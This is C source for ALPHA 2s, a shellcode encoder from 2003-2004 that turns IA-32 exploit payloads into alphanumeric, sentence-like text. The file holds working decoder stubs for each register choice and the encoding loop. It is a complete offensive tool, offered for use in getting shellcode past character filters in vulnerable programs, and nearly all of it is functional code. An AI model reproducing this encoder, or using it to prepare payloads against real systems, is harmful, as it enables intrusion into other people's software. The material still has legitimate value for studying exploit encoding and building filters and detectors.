#include <stdio.h> // printf(), fprintf(), stderr
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()
#include <string.h> // strcasecmp(), strstr()
#include <sys/time.h> //struct timeval, struct timezone, gettimeofday()

#define VERSION_STRING "ALPHA 2s: Space-age. (build 08)"
#define DESCRIPTION    "Alphanumeric sentence like shellcode encoding."
#define COPYRIGHT      "Copyright (C) 2003, 2004 by Berend-Jan Wever."
/*
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,   .sSSSs.  ALPHA 2s: Space age.
   SS"  Y$P"  SY"  ,SY  SS"   `*`
  iS'   dY       ,sS"   `"SSSSs.  Alphanumeric sentence like shellcode encoding.
  YS,  dSb    ,sY"     ss,   .SS  Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP  `*SSSS*'   <skylined@edup.tudelft.nl>
________________________________________________________________________________

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.
*/
#define decoder_body "4SKYLINED4 QZhaBa X4aHP0a AkA4Q2A52B50B5X A BPA8a5wjFQbhx. "

struct decoder {
  char* id; // id of option
  char* code; // the decoder
} decoders[] = {
  { "eax",      "P" decoder_body },
  { "ecx",      "Q" decoder_body },
  { "edx",      "R" decoder_body },
  { "ebx",      "S" decoder_body },
  { "esp",      "T" decoder_body },
  { "ebp",      "U" decoder_body },
  { "esi",      "V" decoder_body },
  { "edi",      "W" decoder_body },
  { "[esp]",    "B" decoder_body },
  { NULL, NULL }
};

void version(void) {
  printf(
    "________________________________________________________________________________\n"
    "\n"
    "    ,sSSs,,s,  ,sSSSs,  " VERSION_STRING "\n"
    "   SS\"  Y$P\"  SY\"  ,SY \n"
    "  iS'   dY       ,sS\"   " DESCRIPTION "\n"
    "  YS,  dSb    ,sY\"      " COPYRIGHT "\n"
    "  `\"YSS'\"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>\n"
    "________________________________________________________________________________\n"
    "\n"
  );
  exit(EXIT_SUCCESS);
}

void help(char* name) {
  printf(
    "Usage: %s [OPTION] [BASEADDRESS]\n"
    "ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\n"
    "It is a encoded\n"
    "version of your origional shellcode. It consists of baseaddress-code with some\n"
    "padding, a decoder routine and the encoded origional shellcode. This will work\n"
    "for any target OS. The resulting shellcode needs to have RWE-access to modify\n"
    "it's own code and decode the origional shellcode in memory.\n"
    "\n"
    "BASEADDRESS\n"
    "  The decoder routine needs have it's baseaddress in specified register(s). The\n"
    "  baseaddress-code copies the baseaddress from the given register or stack\n"
    "  location into the apropriate registers.\n"
    "eax, ecx, edx, ecx, esp, ebp, esi, edi\n"
    "  Take the baseaddress from the given register. (Unicode baseaddress code using\n"
    "  esp will overwrite the byte of memory pointed to by ebp!)\n"
    "[esp]\n"
    "  Take the baseaddress from the stack.\n"
    "-n\n"
    "  Do not output a trailing newline after the shellcode.\n"
    "--sources\n"
    "  Output a list of BASEADDRESS options\n"
    "--help\n"
    "  Display this help and exit\n"
    "--version\n"
    "  Output version information and exit\n"
    "\n"
    "See the source-files for further details and copying conditions. There is NO\n"
    "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n"
    "\n"
    "Acknowledgements:\n"
    "  Thanks to rix for his phrack article on aphanumeric shellcode.\n"
    "  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.\n"
    "\n"
    "Report bugs to <skylined@edup.tudelft.nl>\n",
    name
  );
  exit(EXIT_SUCCESS);
}

//-----------------------------------------------------------------------------
int main(int argc, char* argv[], char* envp[]) {
  int   sources = 0, nonewline = 0;
  int   comma = 0, sentence_length = 0, word_length = 0;
  char* baseaddress = NULL;
  int   i, input, A, B, C, D, E, F;
  char* valid_chars;

  // Random seed  
  struct timeval tv;
  struct timezone tz;
  gettimeofday(&tv, &tz);
  srand((int)tv.tv_sec*1000+tv.tv_usec);

  // Scan all the options and set internal variables accordingly
  for (i=1; i<argc; i++) {
         if (strcmp(argv[i], "--help") == 0) help(argv[0]);
    else if (strcmp(argv[i], "--version") == 0) version();
    else if (strcmp(argv[i], "--sources") == 0) sources = 1;
    else if (strcmp(argv[i], "-n") == 0) nonewline = 1;
    else if (baseaddress == NULL) baseaddress = argv[i];
    else {
      fprintf(stderr, "%s: more then one BASEADDRESS option: `%s' and `%s'\n"
                      "Try `%s --help' for more information.\n",
                      argv[0], baseaddress, argv[i], argv[0]);
      exit(EXIT_FAILURE);
    }
  }

  // No baseaddress option ?
  if (baseaddress == NULL) {
    fprintf(stderr, "%s: missing BASEADDRESS options.\n"
                    "Try `%s --help' for more information.\n", argv[0], argv[0]);
    exit(EXIT_FAILURE);
  }

  // Someone wants to know which baseaddress options are available:
  if (sources) {
    printf("Available baseaddress options:\n");
    for (i=0; decoders[i].id != NULL; i++) {
      printf("  %s", decoders[i].id);
    }
    printf("\n");
    exit(EXIT_SUCCESS);
  }

  // Find and output decoder
  for (i=0; strcasecmp(baseaddress, decoders[i].id) != 0; i++) {
    if (decoders[i+1].id == NULL) {
      fprintf(stderr, "%s: unrecognized baseaddress option `%s'\n"
                      "Try `%s --sources' for a list of BASEADDRESS options.\n",
                      argv[0], baseaddress, argv[0]);
      exit(EXIT_FAILURE);
    }
  }
  printf("%s", decoders[i].code);

  // read, encode and output shellcode
  while ((input = getchar()) != EOF) {
    // encoding AB -> CD 00 EF 00
    A = (input & 0xf0) >> 4;
    B = (input & 0x0f);
    
    valid_chars = "aaaaaaaaaaaeeeeeeeeeeeeeeiiiiiiiiioooooooooooouuuuuuuuuuuuu"
                  "bbbccddfffggghhhjjkkkklllmmnnnnppppqrrrrrrssssstttvvvvwwxyz";
    F = B;
    // E is arbitrary as long as EF is a valid character
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
    E = valid_chars[i] >> 4;
    // AB -> 
    if (sentence_length==0) valid_chars = "EEEEEEEEEEIIIIIIIIIOOOOOOOOUUUUUUUU"
                                          "BBCCDDFFGHHJJKKLLMMNNPPQRRSSTTVWXYZ";
    else valid_chars = "aaaaaaaaaeeeeeeeeeeeeiiiiiiiiioooooooooooouuuuuuuuuuuu"
                  "bbbccddfffggghhhjjkkkklllmmnnnnppppqrrrrrrssssstttvvvvwwxyz";
    D =  A^E;
    // C is arbitrary as long as CD is a valid character
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
    C = valid_chars[i] >> 4;
    printf("%c%c", (C<<4)+D, (E<<4)+F);

    sentence_length++;
    word_length++;
    if (rand() % (60-sentence_length) == 0) {
      sentence_length = 0;
      word_length = 0;
      printf(". ");
    } else if (rand() % (8-word_length) == 0) {
      word_length = 0;
      printf(" ");
    } else if (!comma && rand() % (40-sentence_length) == 0) {
      printf(", ");
      comma = 1;
    }
  }
  if (sentence_length > 0 && word_length > 0) printf(". ");
  printf("A%s", nonewline ? "" : "\n"); // Terminating "A"

  exit(EXIT_SUCCESS);
}
